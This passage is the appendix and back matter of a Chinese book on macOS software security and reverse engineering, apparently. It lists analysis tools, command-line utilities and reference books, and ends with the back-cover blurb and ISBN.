break-word;'>Pacifist</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>文件解包工具</td><td style='text-align: center; word-wrap: break-word;'>https://www.charlessoft.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>BetterZip</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>压缩包管理工具</td><td style='text-align: center; word-wrap: break-word;'>https://macitbetter.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WinZip</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>压缩包管理工具</td><td style='text-align: center; word-wrap: break-word;'>http://www.winzip.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SQLPro for SQLite</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>SQLite数据库管理工具</td><td style='text-align: center; word-wrap: break-word;'>http://www.sqlitepro.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>JD-GUI</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>Jar查看工具</td><td style='text-align: center; word-wrap: break-word;'>http://jd.benow.ca (http://github.com/java-decompiler/jd-gui)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Beyond Compare</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>文件与目录比较工具</td><td style='text-align: center; word-wrap: break-word;'>http://www.scootersoftware.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CocoaPacketAnalyzer</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>网络抓包工具</td><td style='text-align: center; word-wrap: break-word;'>http://www.tastycocoabytes.com/cpa</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WireShark</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>网络抓包工具</td><td style='text-align: center; word-wrap: break-word;'>https://www.wireshark.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Private Eye</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>网络监视工具</td><td style='text-align: center; word-wrap: break-word;'>http://radiosilenceapp.com/private-eye</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Radio Silence</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>网络监视工具</td><td style='text-align: center; word-wrap: break-word;'>http://radiosilenceapp.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Charles</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>网络抓包工具</td><td style='text-align: center; word-wrap: break-word;'>http://www.charlesproxy.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UI Browser</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>UI检查器</td><td style='text-align: center; word-wrap: break-word;'>http://pfiddlesoft.com/uibrowser (Auxiliary tools for Xcode)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UIElementInspector</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>UI检查器</td><td style='text-align: center; word-wrap: break-word;'>OS X SDK Documents</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PackageMaker</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>PKG制作工具</td><td style='text-align: center; word-wrap: break-word;'>https://developer.apple.com/downloads (Auxiliary tools for Xcode)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Flat Package Editor</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>PKG编辑器</td><td style='text-align: center; word-wrap: break-word;'>https://developer.apple.com/downloads (Auxiliary tools for Xcode)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>FileMon</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>文件监视器</td><td style='text-align: center; word-wrap: break-word;'>http://deepit.ru</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PlistEdit Pro</td><td style='text-align: center; word-wrap: break-word;'>收费</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>plist编辑器</td><td style='text-align: center; word-wrap: break-word;'>https://www.fatcatsoftware.com/plisteditpro</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>QtFlex5</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>Qt界面库</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/JackyDing/QtFlex5</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>NSLogger</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>日志查看器</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/fpillet/NSLogger</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Camo</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>Objc类混淆工具</td><td style='text-align: center; word-wrap: break-word;'>http://yonsm.net/camo</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>upx</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>压缩壳</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/upx/upx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Steam</td><td style='text-align: center; word-wrap: break-word;'>免费</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>游戏平台</td><td style='text-align: center; word-wrap: break-word;'>http://www.steampowered.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LuaDec</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>Lua字节码工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/viruscamp/luadec</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ILSpyMac</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>ILSpy移植版本</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/aerror2/ILSpy-For-MacOSX</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>DisUnity</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>是</td><td style='text-align: center; word-wrap: break-word;'>Unity3D游戏资源解包工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/ata4/disunity</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Tuxera Disk Manager</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>NTFS分区读写</td><td style='text-align: center; word-wrap: break-word;'>https://www.tuxera.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Bit Slicer</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>内存搜索与修改工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/zorgiepoo/Bit-Slicer</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>class-dump</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>MachO类 Dump工具</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/nygard/class-dump</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>santa</td><td style='text-align: center; word-wrap: break-word;'>开源</td><td style='text-align: center; word-wrap: break-word;'>否</td><td style='text-align: center; word-wrap: break-word;'>白名单/黑名单系统</td><td style='text-align: center; word-wrap: break-word;'>https://github.com/google/santa</td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>命令名称</td><td style='text-align: center; word-wrap: break-word;'>简介</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>clang</td><td style='text-align: center; word-wrap: break-word;'>Xcode自带的代码编译器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>make</td><td style='text-align: center; word-wrap: break-word;'>程序构建工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ls</td><td style='text-align: center; word-wrap: break-word;'>列目录与文件工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>mv</td><td style='text-align: center; word-wrap: break-word;'>文件移动操作</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ruby</td><td style='text-align: center; word-wrap: break-word;'>系统预置脚本处理器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>id</td><td style='text-align: center; word-wrap: break-word;'>当前用户信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>security</td><td style='text-align: center; word-wrap: break-word;'>命令行版本的keychains与安全框架管理工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>codesign</td><td style='text-align: center; word-wrap: break-word;'>代码签名</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>spctl</td><td style='text-align: center; word-wrap: break-word;'>SecAssessment系统安全规则管理，Gatekeeper管理工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>lipo</td><td style='text-align: center; word-wrap: break-word;'>MachO通用二进制管理工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>otool</td><td style='text-align: center; word-wrap: break-word;'>MachO文件信息查看</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>gobjdump</td><td style='text-align: center; word-wrap: break-word;'>MachO文件信息查看工具，binutils的移植版本，通过HomeBrew安装</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xcodebuild</td><td style='text-align: center; word-wrap: break-word;'>Xcode命令行项目构建工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>update_dyld_shared_cache</td><td style='text-align: center; word-wrap: break-word;'>dyld缓存更新</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>xcrun</td><td style='text-align: center; word-wrap: break-word;'>Xcode开发工具启动与定位工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>dyldinfo</td><td style='text-align: center; word-wrap: break-word;'>MachO符号信息查看</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>install_name_tool</td><td style='text-align: center; word-wrap: break-word;'>动态库安装名称管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ar</td><td style='text-align: center; word-wrap: break-word;'>静态库打包管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>find</td><td style='text-align: center; word-wrap: break-word;'>文件查找</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>productbuild</td><td style='text-align: center; word-wrap: break-word;'>pkg构建工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>tree</td><td style='text-align: center; word-wrap: break-word;'>将目录与文件以树列表形式展示，通过HomeBrew安装</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>rm</td><td style='text-align: center; word-wrap: break-word;'>文件删除</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>grep</td><td style='text-align: center; word-wrap: break-word;'>查找工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>lsbom</td><td style='text-align: center; word-wrap: break-word;'>文件Bom信息查看</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>pkgutil</td><td style='text-align: center; word-wrap: break-word;'>pkg管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>gunzip</td><td style='text-align: center; word-wrap: break-word;'>gzip文件解压</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>pax</td><td style='text-align: center; word-wrap: break-word;'>归档文件管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>file</td><td style='text-align: center; word-wrap: break-word;'>文件信息查看</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>cat</td><td style='text-align: center; word-wrap: break-word;'>文件查看</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>hdiutil</td><td style='text-align: center; word-wrap: break-word;'>磁盘管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>tcpdump</td><td style='text-align: center; word-wrap: break-word;'>网络抓包工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>swift-demangle</td><td style='text-align: center; word-wrap: break-word;'>Swift符号名称解析工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>dtrace</td><td style='text-align: center; word-wrap: break-word;'>程序动态跟踪</td></tr></table>

(续)

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>命令名称</td><td style='text-align: center; word-wrap: break-word;'>简介</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>gdb</td><td style='text-align: center; word-wrap: break-word;'>命令行调试器</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>git</td><td style='text-align: center; word-wrap: break-word;'>代码仓库管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>cc</td><td style='text-align: center; word-wrap: break-word;'>clang编译器的符号链接</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>pip</td><td style='text-align: center; word-wrap: break-word;'>Python包管理工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>launchctl</td><td style='text-align: center; word-wrap: break-word;'>launchd接口命令行工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>plistutil</td><td style='text-align: center; word-wrap: break-word;'>plist文件解密</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>defaults</td><td style='text-align: center; word-wrap: break-word;'>用户defaults系统访问工具</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>crontab</td><td style='text-align: center; word-wrap: break-word;'>Cron作业管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>periodic</td><td style='text-align: center; word-wrap: break-word;'>任务脚本管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>dtruss</td><td style='text-align: center; word-wrap: break-word;'>进程系统调用跟踪工具</td></tr></table>

## 参考资料

本书在写作过程中，阅读了大量的技术博客、安全峰会议题、技术文献以及行业内的专著，其中很多图书作品给了我很多技术上的启发。为方便大家参考学习，下面以表格的形式将它们罗列出来。

### 英文图书

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>书名</td><td style='text-align: center; word-wrap: break-word;'>作者</td><td style='text-align: center; word-wrap: break-word;'>ISBN</td><td style='text-align: center; word-wrap: break-word;'>出版社</td><td style='text-align: center; word-wrap: break-word;'>出版时间</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>iOS and OS X Network Programming Cookbook</td><td style='text-align: center; word-wrap: break-word;'>Jon Hoffman</td><td style='text-align: center; word-wrap: break-word;'>9781849698085</td><td style='text-align: center; word-wrap: break-word;'>Packt</td><td style='text-align: center; word-wrap: break-word;'>2014年</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>The Mac Hackers Handbook</td><td style='text-align: center; word-wrap: break-word;'>Charlie Miller, Dino A. Dai Zovi</td><td style='text-align: center; word-wrap: break-word;'>9780470395363</td><td style='text-align: center; word-wrap: break-word;'>Wiley</td><td style='text-align: center; word-wrap: break-word;'>2009年</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Cocoa Programming for OS X 5th</td><td style='text-align: center; word-wrap: break-word;'>Aaron Hillegass, Adam Preble, Nate Chandler</td><td style='text-align: center; word-wrap: break-word;'>9780134076959</td><td style='text-align: center; word-wrap: break-word;'>Big Nerd Ranch</td><td style='text-align: center; word-wrap: break-word;'>2015年4月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Learning Unix for OS X, 2nd Edition</td><td style='text-align: center; word-wrap: break-word;'>Dave Taylor</td><td style='text-align: center; word-wrap: break-word;'>9781491939987</td><td style='text-align: center; word-wrap: break-word;'>O&#x27;Reilly</td><td style='text-align: center; word-wrap: break-word;'>2016年1月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Xcode 7 Essentials, Second Edition</td><td style='text-align: center; word-wrap: break-word;'>Brett Ohland, Jayant Varma</td><td style='text-align: center; word-wrap: break-word;'>9781785889011</td><td style='text-align: center; word-wrap: break-word;'>Packt</td><td style='text-align: center; word-wrap: break-word;'>2016年2月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Swift OS X Programming for Absolute Beginners</td><td style='text-align: center; word-wrap: break-word;'>Wallace Wang</td><td style='text-align: center; word-wrap: break-word;'>9781484212349</td><td style='text-align: center; word-wrap: break-word;'>Apress</td><td style='text-align: center; word-wrap: break-word;'>2015年</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MacOS and iOS Internals, Volume III: Security &amp; Insecurity</td><td style='text-align: center; word-wrap: break-word;'>Jonathan Levin</td><td style='text-align: center; word-wrap: break-word;'>9780991055531</td><td style='text-align: center; word-wrap: break-word;'>Technologgeeks Press</td><td style='text-align: center; word-wrap: break-word;'>2016年11月</td></tr></table>

### 中文图书

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>书名</td><td style='text-align: center; word-wrap: break-word;'>作者</td><td style='text-align: center; word-wrap: break-word;'>ISBN</td><td style='text-align: center; word-wrap: break-word;'>出版社</td><td style='text-align: center; word-wrap: break-word;'>出版时间</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《Swift与Cocoa框架开发》</td><td style='text-align: center; word-wrap: break-word;'>Jonathon Manning, Paris Buttfie, 译者: 贾洪峰</td><td style='text-align: center; word-wrap: break-word;'>9787115391872</td><td style='text-align: center; word-wrap: break-word;'>人民邮电出版社</td><td style='text-align: center; word-wrap: break-word;'>2015年6月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《OS X与iOS内核编程》</td><td style='text-align: center; word-wrap: break-word;'>Ole Henry Halvorsen, Douglas, 译者: 贾伟</td><td style='text-align: center; word-wrap: break-word;'>9787115318244</td><td style='text-align: center; word-wrap: break-word;'>人民邮电出版社</td><td style='text-align: center; word-wrap: break-word;'>2013年6月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《深入解析Mac OS X &amp; iOS操作系统》</td><td style='text-align: center; word-wrap: break-word;'>Jonathan Levin, 译者: 郑思遥, 房佩慈</td><td style='text-align: center; word-wrap: break-word;'>9787302348672</td><td style='text-align: center; word-wrap: break-word;'>清华大学出版社</td><td style='text-align: center; word-wrap: break-word;'>2014年3月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《图解密码技术（第3版）》</td><td style='text-align: center; word-wrap: break-word;'>结城浩, 译者: 周自恒</td><td style='text-align: center; word-wrap: break-word;'>9787115424914</td><td style='text-align: center; word-wrap: break-word;'>人民邮电出版社</td><td style='text-align: center; word-wrap: break-word;'>2016年6月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《iOS应用逆向工程（第2版）》</td><td style='text-align: center; word-wrap: break-word;'>沙梓社, 吴航</td><td style='text-align: center; word-wrap: break-word;'>9787111494362</td><td style='text-align: center; word-wrap: break-word;'>机械工业出版社</td><td style='text-align: center; word-wrap: break-word;'>2015年4月</td></tr></table>

(续)

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>书名</td><td style='text-align: center; word-wrap: break-word;'>作者</td><td style='text-align: center; word-wrap: break-word;'>ISBN</td><td style='text-align: center; word-wrap: break-word;'>出版社</td><td style='text-align: center; word-wrap: break-word;'>出版时间</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《iOS应用安全攻防实战》</td><td style='text-align: center; word-wrap: break-word;'>约翰坦·斯的扎斯克，译者：肖梓航，李俱顺</td><td style='text-align: center; word-wrap: break-word;'>9787121260742</td><td style='text-align: center; word-wrap: break-word;'>电子工业出版社</td><td style='text-align: center; word-wrap: break-word;'>2015年7月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《应用密码学：协议、算法与C源程序（第2版）》</td><td style='text-align: center; word-wrap: break-word;'>Bruce Schneier，译者：吴世忠，祝世雄，张文政</td><td style='text-align: center; word-wrap: break-word;'>9787111445333</td><td style='text-align: center; word-wrap: break-word;'>机械工业出版社</td><td style='text-align: center; word-wrap: break-word;'>2013年11月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《有趣的二进制：软件安全与逆向分析》</td><td style='text-align: center; word-wrap: break-word;'>爱甲健二，译者：周自恒</td><td style='text-align: center; word-wrap: break-word;'>9787115403995</td><td style='text-align: center; word-wrap: break-word;'>人民邮电出版社</td><td style='text-align: center; word-wrap: break-word;'>2015年10月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《Linux命令行与shell脚本编程大全（第3版）》</td><td style='text-align: center; word-wrap: break-word;'>Richard Blum, Christine Bresnahan,译者：门佳，武海峰</td><td style='text-align: center; word-wrap: break-word;'>9787115429674</td><td style='text-align: center; word-wrap: break-word;'>人民邮电出版社</td><td style='text-align: center; word-wrap: break-word;'>2016年8月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《黑客攻防技术宝典：浏览器实战篇》</td><td style='text-align: center; word-wrap: break-word;'>Wade Alcorn, Christian Frichot, Michele Orrù，译者：奇舞团</td><td style='text-align: center; word-wrap: break-word;'>9787115433947</td><td style='text-align: center; word-wrap: break-word;'>人民邮电出版社</td><td style='text-align: center; word-wrap: break-word;'>2016年10月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《黑客攻防技术宝典：iOS实战篇》</td><td style='text-align: center; word-wrap: break-word;'>Charlie Miller, Dionysus Blazakis, Dino Dai Zovi, Stefan Esser, Vincenzo Iozzo, Ralf-Philipp Weinmann，译者：傅尔也</td><td style='text-align: center; word-wrap: break-word;'>9787115328489</td><td style='text-align: center; word-wrap: break-word;'>人民邮电出版社</td><td style='text-align: center; word-wrap: break-word;'>2013年9月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《软件保护及分析技术》</td><td style='text-align: center; word-wrap: break-word;'>章立春</td><td style='text-align: center; word-wrap: break-word;'>9787121292644</td><td style='text-align: center; word-wrap: break-word;'>电子工业出版社</td><td style='text-align: center; word-wrap: break-word;'>2016年7月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《算法笔记》</td><td style='text-align: center; word-wrap: break-word;'>刁瑞，谢妍</td><td style='text-align: center; word-wrap: break-word;'>9787121286711</td><td style='text-align: center; word-wrap: break-word;'>电子工业出版社</td><td style='text-align: center; word-wrap: break-word;'>2016年7月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《Fiddler调试权威指南》</td><td style='text-align: center; word-wrap: break-word;'>Eric Lawrence，译者：祝洪凯，李妹芳</td><td style='text-align: center; word-wrap: break-word;'>9787115337979</td><td style='text-align: center; word-wrap: break-word;'>人民邮电出版社</td><td style='text-align: center; word-wrap: break-word;'>2014年2月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《游戏安全》</td><td style='text-align: center; word-wrap: break-word;'>腾讯游戏研发部游戏安全中心</td><td style='text-align: center; word-wrap: break-word;'>9787121287831</td><td style='text-align: center; word-wrap: break-word;'>电子工业出版社</td><td style='text-align: center; word-wrap: break-word;'>2016年6月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《漏洞战争》</td><td style='text-align: center; word-wrap: break-word;'>林娅泉</td><td style='text-align: center; word-wrap: break-word;'>9787121289804</td><td style='text-align: center; word-wrap: break-word;'>电子工业出版社</td><td style='text-align: center; word-wrap: break-word;'>2016年6月</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《UNIX环境高级编程（第3版）》</td><td style='text-align: center; word-wrap: break-word;'>W.Richard Stevens, Stephen A.Rago，译者：戚正伟，张亚英，尤晋元</td><td style='text-align: center; word-wrap: break-word;'>9787115352118</td><td style='text-align: center; word-wrap: break-word;'>人民邮电出版社</td><td style='text-align: center; word-wrap: break-word;'>2014年6月</td></tr></table>

本书系统地讲解了软件安全相关的环境搭建、语言基础、文件格式、静态分析、动态调试、破解与防破解、游戏安全、恶意软件等多个主题。知识讲解由浅入深，循序渐进，并且辅以大量实例，还介绍了大量第三方工具的使用，有助于读者做到实践与理论相结合。

图灵社区：iTuring.cn

微 博：@图灵教育 @图灵社区

分类建议 | 计算机/程序设计/软件安全

9 117871151146063911>

ISBN 978-7-115-46063-9

定价：79.00元

